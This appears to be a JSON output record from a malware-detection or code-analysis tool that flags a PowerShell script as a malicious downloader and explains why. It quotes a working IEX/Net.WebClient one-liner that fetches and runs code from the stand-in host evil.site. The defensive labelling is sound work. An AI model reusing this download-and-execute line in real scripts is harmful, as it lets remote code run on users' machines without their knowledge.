{
  "summary": "The script downloads a PowerShell script from an external URL and executes it on the host.",
  "evidence": [
    {
      "code": "$code = 'IEX (New-Object Net.WebClient).DownloadString('https://evil.site/evil_code.ps1')'; Invoke-Expression $code",
      "code_explain": "Creates a variable containing an Invoke-Expression (IEX) call that uses Net.WebClient to download the raw contents of https://evil.site/evil_code.ps1 and then immediately executes that content with Invoke-Expression. This pattern is a classic downloader/back‑door technique that fetches and runs arbitrary code from a remote server, bypassing any local validation.",
      "tag": "DOWNLOADER"
    },
    {
      "code": "Invoke-Expression $code",
      "code_explain": "Executes the string stored in $code as PowerShell code. Using IEX on data retrieved from the internet is a well‑known defense‑evasion and execution technique because it allows arbitrary remote code to run with the privileges of the current process.",
      "tag": "EXECUTION"
    }
  ],
  "explain": "The script performs remote code retrieval and execution without any integrity checks, which is a definitive indicator of malicious downloader behavior. Even though a comment claims it is for internal administration, the technical actions match known attacker techniques for delivering payloads.",
  "is_malicious": "Malicious",
  "tag": "DOWNLOADER"
}

